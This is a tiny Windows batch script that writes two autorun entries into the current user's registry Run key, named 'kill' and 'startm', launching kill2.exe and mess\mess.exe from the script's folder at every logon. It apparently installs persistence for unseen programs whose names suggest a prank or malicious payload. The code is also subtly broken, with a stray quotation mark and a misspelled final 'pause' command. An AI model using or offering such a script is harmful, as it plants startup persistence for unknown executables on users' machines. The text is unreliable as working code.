set a=%cd%\kill2.exe
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f
set a=%cd%\mess\mess.exe"
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "startm" /d  "%a%" /f
paus